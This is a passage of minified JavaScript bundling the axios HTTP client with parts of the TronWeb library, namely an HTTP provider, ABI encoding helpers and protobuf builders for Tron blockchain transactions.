          , mD = yD.validators;
        class bD {
            constructor(e) {
                this.defaults = e,
                this.interceptors = {
                    request: new uU,
                    response: new uU
                }
            }
            async request(e, t) {
                try {
                    return await this._request(e, t)
                } catch (r) {
                    if (r instanceof Error) {
                        let e = {};
                        Error.captureStackTrace ? Error.captureStackTrace(e) : e = new Error;
                        const t = e.stack ? e.stack.replace(/^.+\n/, "") : "";
                        try {
                            r.stack ? t && !String(r.stack).endsWith(t.replace(/^.+\n.+\n/, "")) && (r.stack += "\n" + t) : r.stack = t
                        } catch (_l) {}
                    }
                    throw r
                }
            }
            _request(e, t) {
                "string" === typeof e ? (t = t || {}).url = e : t = e || {},
                t = VU(this.defaults, t);
                const {transitional: r, paramsSerializer: n, headers: o} = t;
                void 0 !== r && yD.assertOptions(r, {
                    silentJSONParsing: mD.transitional(mD.boolean),
                    forcedJSONParsing: mD.transitional(mD.boolean),
                    clarifyTimeoutError: mD.transitional(mD.boolean)
                }, !1),
                null != n && (KF.isFunction(n) ? t.paramsSerializer = {
                    serialize: n
                } : yD.assertOptions(n, {
                    encode: mD.function,
                    serialize: mD.function
                }, !0)),
                void 0 !== t.allowAbsoluteUrls || (void 0 !== this.defaults.allowAbsoluteUrls ? t.allowAbsoluteUrls = this.defaults.allowAbsoluteUrls : t.allowAbsoluteUrls = !0),
                yD.assertOptions(t, {
                    baseUrl: mD.spelling("baseURL"),
                    withXsrfToken: mD.spelling("withXSRFToken")
                }, !0),
                t.method = (t.method || this.defaults.method || "get").toLowerCase();
                let i = o && KF.merge(o.common, o[t.method]);
                o && KF.forEach(["delete", "get", "head", "post", "put", "patch", "common"], (e => {
                    delete o[e]
                }
                )),
                t.headers = BU.concat(i, o);
                const s = [];
                let a = !0;
                this.interceptors.request.forEach((function(e) {
                    "function" === typeof e.runWhen && !1 === e.runWhen(t) || (a = a && e.synchronous,
                    s.unshift(e.fulfilled, e.rejected))
                }
                ));
                const c = [];
                let l;
                this.interceptors.response.forEach((function(e) {
                    c.push(e.fulfilled, e.rejected)
                }
                ));
                let u, d = 0;
                if (!a) {
                    const e = [hD.bind(this), void 0];
                    for (e.unshift.apply(e, s),
                    e.push.apply(e, c),
                    u = e.length,
                    l = Promise.resolve(t); d < u; )
                        l = l.then(e[d++], e[d++]);
                    return l
                }
                u = s.length;
                let h = t;
                for (d = 0; d < u; ) {
                    const e = s[d++]
                      , t = s[d++];
                    try {
                        h = e(h)
                    } catch (f) {
                        t.call(this, f);
                        break
                    }
                }
                try {
                    l = hD.call(this, h)
                } catch (f) {
                    return Promise.reject(f)
                }
                for (d = 0,
                u = c.length; d < u; )
                    l = l.then(c[d++], c[d++]);
                return l
            }
            getUri(e) {
                return lU(jU((e = VU(this.defaults, e)).baseURL, e.url, e.allowAbsoluteUrls), e.params, e.paramsSerializer)
            }
        }
        KF.forEach(["delete", "get", "head", "options"], (function(e) {
            bD.prototype[e] = function(t, r) {
                return this.request(VU(r || {}, {
                    method: e,
                    url: t,
                    data: (r || {}).data
                }))
            }
        }
        )),
        KF.forEach(["post", "put", "patch"], (function(e) {
            function t(t) {
                return function(r, n, o) {
                    return this.request(VU(o || {}, {
                        method: e,
                        headers: t ? {
                            "Content-Type": "multipart/form-data"
                        } : {},
                        url: r,
                        data: n
                    }))
                }
            }
            bD.prototype[e] = t(),
            bD.prototype[e + "Form"] = t(!0)
        }
        ));
        const vD = bD;
        class wD {
            constructor(e) {
                if ("function" !== typeof e)
                    throw new TypeError("executor must be a function.");
                let t;
                this.promise = new Promise((function(e) {
                    t = e
                }
                ));
                const r = this;
                this.promise.then((e => {
                    if (!r._listeners)
                        return;
                    let t = r._listeners.length;
                    for (; t-- > 0; )
                        r._listeners[t](e);
                    r._listeners = null
                }
                )),
                this.promise.then = e => {
                    let t;
                    const n = new Promise((e => {
                        r.subscribe(e),
                        t = e
                    }
                    )).then(e);
                    return n.cancel = function() {
                        r.unsubscribe(t)
                    }
                    ,
                    n
                }
                ,
                e((function(e, n, o) {
                    r.reason || (r.reason = new WU(e,n,o),
                    t(r.reason))
                }
                ))
            }
            throwIfRequested() {
                if (this.reason)
                    throw this.reason
            }
            subscribe(e) {
                this.reason ? e(this.reason) : this._listeners ? this._listeners.push(e) : this._listeners = [e]
            }
            unsubscribe(e) {
                if (!this._listeners)
                    return;
                const t = this._listeners.indexOf(e);
                -1 !== t && this._listeners.splice(t, 1)
            }
            toAbortSignal() {
                const e = new AbortController
                  , t = t => {
                    e.abort(t)
                }
                ;
                return this.subscribe(t),
                e.signal.unsubscribe = () => this.unsubscribe(t),
                e.signal
            }
            static source() {
                let e;
                const t = new wD((function(t) {
                    e = t
                }
                ));
                return {
                    token: t,
                    cancel: e
                }
            }
        }
        const TD = wD;
        const AD = {
            Continue: 100,
            SwitchingProtocols: 101,
            Processing: 102,
            EarlyHints: 103,
            Ok: 200,
            Created: 201,
            Accepted: 202,
            NonAuthoritativeInformation: 203,
            NoContent: 204,
            ResetContent: 205,
            PartialContent: 206,
            MultiStatus: 207,
            AlreadyReported: 208,
            ImUsed: 226,
            MultipleChoices: 300,
            MovedPermanently: 301,
            Found: 302,
            SeeOther: 303,
            NotModified: 304,
            UseProxy: 305,
            Unused: 306,
            TemporaryRedirect: 307,
            PermanentRedirect: 308,
            BadRequest: 400,
            Unauthorized: 401,
            PaymentRequired: 402,
            Forbidden: 403,
            NotFound: 404,
            MethodNotAllowed: 405,
            NotAcceptable: 406,
            ProxyAuthenticationRequired: 407,
            RequestTimeout: 408,
            Conflict: 409,
            Gone: 410,
            LengthRequired: 411,
            PreconditionFailed: 412,
            PayloadTooLarge: 413,
            UriTooLong: 414,
            UnsupportedMediaType: 415,
            RangeNotSatisfiable: 416,
            ExpectationFailed: 417,
            ImATeapot: 418,
            MisdirectedRequest: 421,
            UnprocessableEntity: 422,
            Locked: 423,
            FailedDependency: 424,
            TooEarly: 425,
            UpgradeRequired: 426,
            PreconditionRequired: 428,
            TooManyRequests: 429,
            RequestHeaderFieldsTooLarge: 431,
            UnavailableForLegalReasons: 451,
            InternalServerError: 500,
            NotImplemented: 501,
            BadGateway: 502,
            ServiceUnavailable: 503,
            GatewayTimeout: 504,
            HttpVersionNotSupported: 505,
            VariantAlsoNegotiates: 506,
            InsufficientStorage: 507,
            LoopDetected: 508,
            NotExtended: 510,
            NetworkAuthenticationRequired: 511
        };
        Object.entries(AD).forEach((e => {
            let[t,r] = e;
            AD[r] = t
        }
        ));
        const ED = AD;
        const PD = function e(t) {
            const r = new vD(t)
              , n = dF(vD.prototype.request, r);
            return KF.extend(n, vD.prototype, r, {
                allOwnKeys: !0
            }),
            KF.extend(n, r, null, {
                allOwnKeys: !0
            }),
            n.create = function(r) {
                return e(VU(t, r))
            }
            ,
            n
        }(TU);
        PD.Axios = vD,
        PD.CanceledError = WU,
        PD.CancelToken = TD,
        PD.isCancel = OU,
        PD.VERSION = fD,
        PD.toFormData = nU,
        PD.AxiosError = XF,
        PD.Cancel = PD.CanceledError,
        PD.all = function(e) {
            return Promise.all(e)
        }
        ,
        PD.spread = function(e) {
            return function(t) {
                return e.apply(null, t)
            }
        }
        ,
        PD.isAxiosError = function(e) {
            return KF.isObject(e) && !0 === e.isAxiosError
        }
        ,
        PD.mergeConfig = VU,
        PD.AxiosHeaders = BU,
        PD.formToJSON = e => vU(KF.isHTMLForm(e) ? new FormData(e) : e),
        PD.getAdapter = uD,
        PD.HttpStatusCode = ED,
        PD.default = PD;
        const CD = PD;
        class SD {
            constructor(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 3e4
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : ""
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : ""
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : {}
                  , i = arguments.length > 5 && void 0 !== arguments[5] ? arguments[5] : "/";
                if ((0,
                CI.A)(this, "host", void 0),
                (0,
                CI.A)(this, "timeout", void 0),
                (0,
                CI.A)(this, "user", void 0),
                (0,
                CI.A)(this, "password", void 0),
                (0,
                CI.A)(this, "headers", void 0),
                (0,
                CI.A)(this, "statusPage", void 0),
                (0,
                CI.A)(this, "instance", void 0),
                !iS(e))
                    throw new Error("Invalid URL provided to HttpProvider");
                if (isNaN(t) || t < 0)
                    throw new Error("Invalid timeout duration provided");
                if (!sS(o))
                    throw new Error("Invalid headers object provided");
                e = e.replace(/\/+$/, ""),
                this.host = e,
                this.timeout = t,
                this.user = r,
                this.password = n,
                this.headers = o,
                this.statusPage = i,
                this.instance = CD.create({
                    baseURL: e,
                    timeout: t,
                    headers: o,
                    auth: r ? {
                        username: r,
                        password: n
                    } : void 0
                })
            }
            setStatusPage() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "/";
                this.statusPage = e
            }
            async isConnected() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.statusPage;
                return this.request(e).then((e => yS(e, "blockID", "block_header"))).catch(( () => !1))
            }
            request(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "get";
                return r = r.toLowerCase(),
                this.instance.request({
                    data: "post" == r && Object.keys(t).length ? t : null,
                    params: "get" == r && t,
                    url: e,
                    method: r
                }).then((e => {
                    let {data: t} = e;
                    return t
                }
                ))
            }
        }
        const ID = {
            HttpProvider: SD
        };
        const BD = r(8470);
        var xD = r(9087);
        const OD = new bW;
        function _D(e) {
            return lj.address.toHex(e).replace(JN, "0x")
        }
        function WD(e, t, r) {
            if (arguments.length > 3 && void 0 !== arguments[3] && arguments[3] && r.replace(/^0x/, "").length % 64 === 8 && (r = "0x" + r.replace(/^0x/, "").substring(8)),
            r.replace(/^0x/, "").length % 64)
                throw new Error("The encoded string is not valid. Its length must be a multiple of 64.");
            return t = t.map((e => (/trcToken/.test(e) && (e = e.replace(/trcToken/, "uint256")),
            e))),
            OD.decode(t, r).reduce(( (r, n, o) => ("address" == t[o] && (n = ZN + n.substr(2).toLowerCase()),
            e.length ? r[e[o]] = n : r.push(n),
            r)), e.length ? {} : [])
        }
        function RD(e, t) {
            for (let r = 0; r < e.length; r++)
                "address" === e[r] && (t[r] = lj.address.toHex(t[r]).replace(JN, "0x"));
            return OD.encode(e, t)
        }
        function kD(e) {
            const t = e.match(/([a-zA-Z0-9])(\[.*\])/);
            return t ? t[2] : ""
        }
        function MD(e) {
            return (kD(e).match(/\]\[/g) || []).length + 1
        }
        function ND(e, t) {
            const r = []
              , n = e => {
                if (e && 0 === e.type.indexOf("tuple") && e.components) {
                    const t = e.components.map((e => n(e)));
                    return "tuple(".concat(t.join(","), ")").concat(kD(e.type))
                }
                return /trcToken/.test(e.type) ? e.type.replace(/trcToken/, "uint256") : e.type
            }
              , o = e => Array.isArray(e) ? (e.forEach(( (t, r) => {
                e[r] = o(t)
            }
            )),
            e) : _D(e)
              , i = (e, t, r) => {
                r > 1 ? t.length && t.forEach((t => {
                    i(e, t, r - 1)
                }
                )) : t.length && r && t.forEach((t => {
                    s(e, t)
                }
                ))
            }
              , s = function() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : []
                  , t = arguments.length > 1 ? arguments[1] : void 0;
                e.length && e.forEach(( (e, r) => {
                    const n = e.type;
                    if (t[r])
                        if ("address" === n)
                            t[r] = _D(t[r]);
                        else if ("address[" === n.match(/^([^\x5b]*)(\x5b|$)/)[0])
                            o(t[r]);
                        else if (0 === n.indexOf("tuple"))
                            if (kD(n)) {
                                const o = MD(n);
                                i(e.components, t[r], o)
                            } else
                                s(e.components, t[r])
                }
                ))
            };
            if (e.inputs && e.inputs.length)
                for (let a = 0; a < e.inputs.length; a++) {
                    const o = e.inputs[a].type;
                    "bool" === o && "false" === t[a] && (t[a] = !1),
                    r.push(0 === o.indexOf("tuple") ? n(e.inputs[a]) : o),
                    t.length < r.length && t.push("")
                }
            return s(e.inputs, t),
            (e => {
                for (let t = 0; t < e.length; t++) {
                    const r = e[t];
                    /trcToken/.test(r) && (e[t] = r.replace(/trcToken/, "uint256"))
                }
            }
            )(r),
            OD.encode(r, t)
        }
        function FD(e, t) {
            const r = e => Array.isArray(e) ? (e.forEach(( (t, n) => {
                e[n] = r(t)
            }
            )),
            e) : lj.address.toHex(e)
              , n = (e, t, r) => {
                r > 1 ? t.length && t.forEach((t => {
                    n(e, t, r - 1)
                }
                )) : t.length && r && t.forEach((t => {
                    i(e, t)
                }
                ))
            }
              , o = e => {
                const t = e.name ? " ".concat(e.name) : "";
                if (e && 0 === e.type.indexOf("tuple") && e.components) {
                    const r = e.components.map((e => o(e)));
                    return "tuple(".concat(r.join(","), ")").concat(kD(e.type)).concat(t)
                }
                return /trcToken/.test(e.type) ? e.type.replace(/trcToken/, "uint256") + t : e.type + t
            }
              , i = (e, t) => {
                e.length && e.forEach(( (e, o) => {
                    const {type: s, name: a} = e;
                    if (t[o])
                        if ("address" === s)
                            t[o] = lj.address.toHex(t[o]),
                            a && (t[a] = lj.address.toHex(t[o]));
                        else if ("address[" === s.match(/^([^\x5b]*)(\x5b|$)/)[0])
                            r(t[o]),
                            a && (t[a] = r(t[o]));
                        else if (0 === s.indexOf("tuple")) {
                            if (kD(s)) {
                                const r = MD(s);
                                n(e.components, t[o], r)
                            } else
                                i(e.components, t[o]);
                            a && (t[a] = t[o])
                        } else
                            a && (t[a] = t[o]);
                    else
                        a && (t[a] = t[o])
                }
                ))
            }
            ;
            if ("outputs"in e && e.outputs && e.outputs.length > 0) {
                const r = [];
                for (let t = 0; t < e.outputs.length; t++) {
                    const n = e.outputs[t].type
                      , i = e.outputs[t].name ? " ".concat(e.outputs[t].name) : "";
                    r.push(0 === n.indexOf("tuple") ? o(e.outputs[t]) : n + i)
                }
                (e => {
                    for (let t = 0; t < e.length; t++) {
                        const r = e[t];
                        /^trcToken/.test(r) && (e[t] = r.replace(/^trcToken/, "uint256"))
                    }
                }
                )(r),
                t && t.length || (t = new Uint8Array(32 * e.outputs.length));
                const n = OD.decode(r, t).toArray(!0);
                return i(e.outputs, n),
                n
            }
            return []
        }
        class UD {
            invalid(e) {
                return e.msg || "Invalid ".concat(e.name).concat("address" === e.type ? " address" : "", " provided")
            }
            notPositive(e) {
                return "".concat(e.name, " must be a positive integer")
            }
            notEqual(e) {
                var t, r;
                return e.msg || "".concat(null === (t = e.names) || void 0 === t ? void 0 : t[0], " can not be equal to ").concat(null === (r = e.names) || void 0 === r ? void 0 : r[1])
            }
            notValid(e) {
                const t = {};
                let r = !1;
                for (const n of e) {
                    const {name: e, names: o, value: i, type: s, gt: a, lt: c, gte: l, lte: u, optional: d} = n;
                    if (!d || wS(i) && ("boolean" === s || !1 !== i)) {
                        switch (t[e] = n.value,
                        s) {
                        case "address":
                            iF(i) ? t[e] = tF(i) : r = !0;
                            break;
                        case "integer":
                            (!pS(i) || "number" === typeof a && i <= a || "number" === typeof c && i >= c || "number" === typeof l && i < l || "number" === typeof u && i > u) && (r = !0);
                            break;
                        case "positive-integer":
                            if (!pS(i) || i <= 0)
                                throw new Error(this.notPositive(n));
                            break;
                        case "tokenId":
                        case "not-empty-string":
                            dS(i) && i.length || (r = !0);
                            break;
                        case "notEmptyObject":
                            sS(i) && Object.keys(i).length || (r = !0);
                            break;
                        case "notEqual":
                            if (o && t[o[0]] === t[o[1]])
                                throw new Error(this.notEqual(n));
                            break;
                        case "resource":
                            ["BANDWIDTH", "ENERGY"].includes(i) || (r = !0);
                            break;
                        case "url":
                            iS(i) || (r = !0);
                            break;
                        case "hex":
                            fS(i) || (r = !0);
                            break;
                        case "array":
                            Array.isArray(i) || (r = !0);
                            break;
                        case "boolean":
                            lS(i) || (r = !0);
                            break;
                        case "string":
                            (!dS(i) || "number" === typeof a && i.length <= a || "number" === typeof c && i.length >= c || "number" === typeof l && i.length < l || "number" === typeof u && i.length > u) && (r = !0)
                        }
                        if (r)
                            throw new Error(this.invalid(n))
                    }
                }
                return !1
            }
        }
        var DD, LD, jD;
        !function(e) {
            e.AccountCreateContract = "AccountCreateContract",
            e.TransferContract = "TransferContract",
            e.TransferAssetContract = "TransferAssetContract",
            e.VoteAssetContract = "VoteAssetContract",
            e.VoteWitnessContract = "VoteWitnessContract",
            e.WitnessCreateContract = "WitnessCreateContract",
            e.AssetIssueContract = "AssetIssueContract",
            e.WitnessUpdateContract = "WitnessUpdateContract",
            e.ParticipateAssetIssueContract = "ParticipateAssetIssueContract",
            e.AccountUpdateContract = "AccountUpdateContract",
            e.FreezeBalanceContract = "FreezeBalanceContract",
            e.UnfreezeBalanceContract = "UnfreezeBalanceContract",
            e.CancelAllUnfreezeV2Contract = "CancelAllUnfreezeV2Contract",
            e.WithdrawBalanceContract = "WithdrawBalanceContract",
            e.UnfreezeAssetContract = "UnfreezeAssetContract",
            e.UpdateAssetContract = "UpdateAssetContract",
            e.ProposalCreateContract = "ProposalCreateContract",
            e.ProposalApproveContract = "ProposalApproveContract",
            e.ProposalDeleteContract = "ProposalDeleteContract",
            e.SetAccountIdContract = "SetAccountIdContract",
            e.CustomContract = "CustomContract",
            e.CreateSmartContract = "CreateSmartContract",
            e.TriggerSmartContract = "TriggerSmartContract",
            e.GetContract = "GetContract",
            e.UpdateSettingContract = "UpdateSettingContract",
            e.ExchangeCreateContract = "ExchangeCreateContract",
            e.ExchangeInjectContract = "ExchangeInjectContract",
            e.ExchangeWithdrawContract = "ExchangeWithdrawContract",
            e.ExchangeTransactionContract = "ExchangeTransactionContract",
            e.UpdateEnergyLimitContract = "UpdateEnergyLimitContract",
            e.AccountPermissionUpdateContract = "AccountPermissionUpdateContract",
            e.ClearABIContract = "ClearABIContract",
            e.UpdateBrokerageContract = "UpdateBrokerageContract",
            e.ShieldedTransferContract = "ShieldedTransferContract",
            e.MarketSellAssetContract = "MarketSellAssetContract",
            e.MarketCancelOrderContract = "MarketCancelOrderContract",
            e.FreezeBalanceV2Contract = "FreezeBalanceV2Contract",
            e.UnfreezeBalanceV2Contract = "UnfreezeBalanceV2Contract",
            e.WithdrawExpireUnfreezeContract = "WithdrawExpireUnfreezeContract",
            e.DelegateResourceContract = "DelegateResourceContract",
            e.UnDelegateResourceContract = "UnDelegateResourceContract",
            e.UNRECOGNIZED = "UNRECOGNIZED"
        }(DD || (DD = {})),
        function(e) {
            e[e.Owner = 0] = "Owner",
            e[e.Witness = 1] = "Witness",
            e[e.Active = 2] = "Active",
            e[e.UNRECOGNIZED = -1] = "UNRECOGNIZED"
        }(LD || (LD = {})),
        function(e) {
            e[e.Normal = 0] = "Normal",
            e[e.AssetIssue = 1] = "AssetIssue",
            e[e.Contract = 2] = "Contract",
            e[e.UNRECOGNIZED = -1] = "UNRECOGNIZED"
        }(jD || (jD = {}));
        var zD = r(3708);
        r(1184),
        r(7647),
        r(1491),
        r(6864),
        r(4341),
        r(2902),
        r(6228),
        r(9558),
        r(5003),
        r(3058);
        const {Transaction: VD, Permission: HD, Key: qD} = globalThis.TronWebProto
          , {TransferContract: GD, FreezeBalanceContract: $D, UnfreezeBalanceContract: KD, WithdrawBalanceContract: ZD, FreezeBalanceV2Contract: YD, UnfreezeBalanceV2Contract: JD, CancelAllUnfreezeV2Contract: XD, WithdrawExpireUnfreezeContract: QD, DelegateResourceContract: eL, UnDelegateResourceContract: tL} = globalThis.TronWebProto
          , {TransferAssetContract: rL, ParticipateAssetIssueContract: nL, AssetIssueContract: oL, UpdateAssetContract: iL} = globalThis.TronWebProto
          , {TriggerSmartContract: sL, ClearABIContract: aL, UpdateEnergyLimitContract: cL, UpdateSettingContract: lL, CreateSmartContract: uL, SmartContract: dL} = globalThis.TronWebProto
          , {ResourceCode: hL} = globalThis.TronWebProto
          , {WitnessCreateContract: fL, VoteWitnessContract: pL} = globalThis.TronWebProto
          , {UpdateBrokerageContract: gL} = globalThis.TronWebProto
          , {AccountCreateContract: yL, AccountUpdateContract: mL, SetAccountIdContract: bL, AccountPermissionUpdateContract: vL} = globalThis.TronWebProto
          , {ProposalCreateContract: wL, ProposalDeleteContract: TL, ProposalApproveContract: AL} = globalThis.TronWebProto
          , {ExchangeCreateContract: EL, ExchangeInjectContract: PL, ExchangeWithdrawContract: CL, ExchangeTransactionContract: SL} = globalThis.TronWebProto
          , IL = e => e && 0 !== e.length ? new Uint8Array(uj.address.toHex(e).match(/.{1,2}/g).map((e => parseInt(e, 16)))) : new Uint8Array([])
          , BL = e => e && 0 !== e.length ? new Uint8Array((fS(e) ? e : uj.toHex(e)).replace(/^0x/, "").match(/.{1,2}/g).map((e => parseInt(e, 16)))) : new Uint8Array([])
          , xL = (e, t) => BL(t ? uj.fromUtf8(e).replace(/^0x/, "") : e.replace(/^0x/, ""))
          , OL = (e, t, r, n) => {
            const o = new zD.Any;
            o.pack(e.serializeBinary(), "protocol." + r);
            const i = new VD.Contract;
            i.setType(t),
            i.setParameter(o),
            n && i.setPermissionId(n);
            const s = new VD.raw;
            s.addContract(i);
            const a = new VD;
            return a.setRawData(s),
            a
        }
          , _L = (e, t) => {
            const r = new sL
              , {owner_address: n, contract_address: o, parameter: i="", function_selector: s, call_value: a, call_token_value: c, token_id: l, data: u} = e;
            if (r.setOwnerAddress(IL(n)),
            r.setContractAddress(IL(o)),
            r.setCallValue(a),
            u)
                r.setData(BL(u));
            else if (s) {
                const e = function(e) {
                    return (arguments.length > 1 && void 0 !== arguments[1] && !arguments[1] ? "" : "0x") + ix(Buffer.from(e, "utf-8")).toString().substring(2)
                }(s).substring(2, 10) + i;
                r.setData(BL(e))
            }
            return l && r.setTokenId(l),
            c && r.setCallTokenValue(c),
            OL(r, VD.Contract.ContractType.TRIGGERSMARTCONTRACT, "TriggerSmartContract", t.Permission_id)
        }
          , WL = (e, t) => {
            const r = new vL
              , {owner_address: n, owner: o, witness: i, actives: s} = e;
            r.setOwnerAddress(IL(n));
            const a = e => {
                const t = new HD
                  , {type: r, id: n, permission_name: o, threshold: i, parentId: s, operations: a, keys: c} = e;
                return t.setType((e => isNaN(e) ? "Active" === e ? 2 : "Witness" === e ? 1 : 0 : e)(r)),
                t.setId(n),
                t.setPermissionName(o),
                t.setThreshold(i),
                s && t.setParentId(s),
                a && t.setOperations(BL(a)),
                c && t.setKeysList(c.map((e => {
                    const t = new qD;
                    return t.setAddress(IL(e.address)),
                    t.setWeight(e.weight),
                    t
                }
                ))),
                t
            }
            ;
            return o && r.setOwner(a(o)),
            i && r.setWitness(a(i)),
            s && (Array.isArray(s) ? r.setActivesList(s.map((e => a(e)))) : r.setActivesList([a(s)])),
            OL(r, VD.Contract.ContractType.ACCOUNTPERMISSIONUPDATECONTRACT, "AccountPermissionUpdateContract", t.Permission_id)
        }
          , RL = (e, t, r) => {
            switch (e.type) {
            case "TransferContract":
                return ( (e, t) => {
                    const {to_address: r, owner_address: n, amount: o} = e
                      , i = new GD;
                    return i.setToAddress(IL(r)),
                    i.setOwnerAddress(IL(n)),
                    i.setAmount(o),
                    OL(i, VD.Contract.ContractType.TRANSFERCONTRACT, "TransferContract", t.Permission_id)
                }
                )(t, r);
            case "TransferAssetContract":
                return ( (e, t) => {
                    const {to_address: r, owner_address: n, amount: o, asset_name: i} = e
                      , s = new rL;
                    return s.setToAddress(IL(r)),
                    s.setOwnerAddress(IL(n)),
                    s.setAssetName(xL(i, t.visible)),
                    s.setAmount(o),
                    OL(s, VD.Contract.ContractType.TRANSFERASSETCONTRACT, "TransferAssetContract", t.Permission_id)
                }
                )(t, r);
            case "ParticipateAssetIssueContract":
                return ( (e, t) => {
                    const r = new nL;
                    return r.setToAddress(IL(e.to_address)),
                    r.setOwnerAddress(IL(e.owner_address)),
                    r.setAssetName(xL(e.asset_name, t.visible)),
                    r.setAmount(e.amount),
                    OL(r, VD.Contract.ContractType.PARTICIPATEASSETISSUECONTRACT, "ParticipateAssetIssueContract", t.Permission_id)
                }
                )(t, r);
            case "TriggerSmartContract":
                return _L(t, r);
            case "FreezeBalanceContract":
                return ( (e, t) => {
                    const r = new $D
                      , {owner_address: n, frozen_balance: o, frozen_duration: i, resource: s, receiver_address: a} = e;
                    return r.setOwnerAddress(IL(n)),
                    r.setFrozenBalance(o),
                    r.setFrozenDuration(i),
                    s && r.setResource(hL[s]),
                    a && r.setReceiverAddress(IL(a)),
                    OL(r, VD.Contract.ContractType.FREEZEBALANCECONTRACT, "FreezeBalanceContract", t.Permission_id)
                }
                )(t, r);
            case "UnfreezeBalanceContract":
                return ( (e, t) => {
                    const r = new KD
                      , {owner_address: n, resource: o, receiver_address: i} = e;
                    return r.setOwnerAddress(IL(n)),
                    o && r.setResource(hL[o]),
                    i && r.setReceiverAddress(IL(i)),
                    OL(r, VD.Contract.ContractType.UNFREEZEBALANCECONTRACT, "UnfreezeBalanceContract", t.Permission_id)
                }
                )(t, r);
            case "WithdrawBalanceContract":
                return ( (e, t) => {
                    const r = new ZD
                      , {owner_address: n} = e;
                    return r.setOwnerAddress(IL(n)),
                    OL(r, VD.Contract.ContractType.WITHDRAWBALANCECONTRACT, "WithdrawBalanceContract", t.Permission_id)
                }
                )(t, r);
            case "FreezeBalanceV2Contract":
                return ( (e, t) => {
                    const r = new YD
                      , {owner_address: n, frozen_balance: o, resource: i} = e;
                    return r.setOwnerAddress(IL(n)),
                    r.setFrozenBalance(o),
                    r.setResource(hL[i]),
                    OL(r, VD.Contract.ContractType.FREEZEBALANCEV2CONTRACT, "FreezeBalanceV2Contract", t.Permission_id)
                }
                )(t, r);
            case "CancelAllUnfreezeV2Contract":
                return ( (e, t) => {
                    const r = new XD
                      , {owner_address: n} = e;
                    return r.setOwnerAddress(IL(n)),
                    OL(r, VD.Contract.ContractType.CANCELALLUNFREEZEV2CONTRACT, "CancelAllUnfreezeV2Contract", t.Permission_id)
                }
                )(t, r);
            case "UnfreezeBalanceV2Contract":
                return ( (e, t) => {
                    const r = new JD
                      , {owner_address: n, unfreeze_balance: o, resource: i} = e;
                    return r.setOwnerAddress(IL(n)),
                    r.setUnfreezeBalance(o),
                    r.setResource(hL[i]),
                    OL(r, VD.Contract.ContractType.UNFREEZEBALANCEV2CONTRACT, "UnfreezeBalanceV2Contract", t.Permission_id)
                }
                )(t, r);
            case "DelegateResourceContract":
                return ( (e, t) => {
                    const r = new eL
                      , {owner_address: n, receiver_address: o, balance: i, resource: s, lock: a=!1, lock_period: c} = e;
                    return r.setOwnerAddress(IL(n)),
                    r.setBalance(i),
                    r.setResource(hL[s]),
                    r.setLock(a),
                    r.setLockPeriod(c),
                    r.setReceiverAddress(IL(o)),
                    OL(r, VD.Contract.ContractType.DELEGATERESOURCECONTRACT, "DelegateResourceContract", t.Permission_id)
                }
                )(t, r);
            case "UnDelegateResourceContract":
                return ( (e, t) => {
                    const r = new tL
                      , {owner_address: n, receiver_address: o, balance: i, resource: s} = e;
                    return r.setOwnerAddress(IL(n)),
                    r.setBalance(i),
                    r.setResource(hL[s]),
                    r.setReceiverAddress(IL(o)),
                    OL(r, VD.Contract.ContractType.UNDELEGATERESOURCECONTRACT, "UnDelegateResourceContract", t.Permission_id)
                }
                )(t, r);
            case "WithdrawExpireUnfreezeContract":
                return ( (e, t) => {
                    const r = new QD
                      , {owner_address: n} = e;
                    return r.setOwnerAddress(IL(n)),
                    OL(r, VD.Contract.ContractType.WITHDRAWEXPIREUNFREEZECONTRACT, "WithdrawExpireUnfreezeContract", t.Permission_id)
                }
                )(t, r);
            case "WitnessCreateContract":
                return ( (e, t) => {
                    const r = new fL
                      , {owner_address: n, url: o} = e;
                    return r.setOwnerAddress(IL(n)),
                    r.setUrl(BL(o.replace(/^0x/, ""))),
                    OL(r, VD.Contract.ContractType.WITNESSCREATECONTRACT, "WitnessCreateContract", t.Permission_id)
                }
                )(t, r);
            case "VoteWitnessContract":
                return ( (e, t) => {
                    const r = new pL
                      , {owner_address: n, votes: o} = e;
                    return r.setOwnerAddress(IL(n)),
                    o.forEach((e => {
                        const t = new pL.Vote
                          , {vote_address: n, vote_count: o} = e;
                        t.setVoteAddress(IL(n));
                        const i = parseInt(o);
                        t.setVoteCount(i),
                        r.addVotes(t)
                    }
                    )),
                    OL(r, VD.Contract.ContractType.VOTEWITNESSCONTRACT, "VoteWitnessContract", t.Permission_id)
                }
                )(t, r);
            case "CreateSmartContract":
                return ( (e, t) => {
                    const r = null !== e && void 0 !== e && e.new_contract ? (0,
                    k.A)((0,
                    k.A)({}, {
                        owner_address: e.owner_address,
                        call_token_value: e.call_token_value,
                        token_id: e.token_id
                    }), e.new_contract) : e
                      , {owner_address: n, consume_user_resource_percent: o, origin_energy_limit: i, abi: s, bytecode: a="", parameter: c="", call_value: l, call_token_value: u, token_id: d, name: h} = r;
                    let {origin_address: f} = r;
                    const p = new uL;
                    p.setOwnerAddress(IL(n)),
                    d && p.setTokenId(d),
                    u && p.setCallTokenValue(u);
                    const g = new dL;
                    if (s) {
                        let e;
                        e = "string" === typeof s ? JSON.parse(s) : (null === s || void 0 === s ? void 0 : s.entrys) || [];
                        const t = new dL.ABI
                          , r = e => {
                            const t = new dL.ABI.Entry.Param
                              , {indexed: r, name: n, type: o} = e;
                            return !0 === r && t.setIndexed(!0),
                            t.setName(n),
                            t.setType(o),
                            t
                        }
                          , n = e.map((e => {
                            const {anonymous: t, constant: n, name: o, inputs: i, outputs: s, type: a, payable: c, stateMutability: l} = e
                              , u = new dL.ABI.Entry;
                            return u.setAnonymous(t),
                            u.setConstant(n),
                            u.setName(o),
                            i && u.setInputsList(i.map((e => r(e)))),
                            s && u.setOutputsList(s.map((e => r(e)))),
                            a && u.setType(dL.ABI.Entry.EntryType[a.toUpperCase()]),
                            u.setPayable(c),
                            l && u.setStatemutability(dL.ABI.Entry.StateMutabilityType[l.toUpperCase()]),
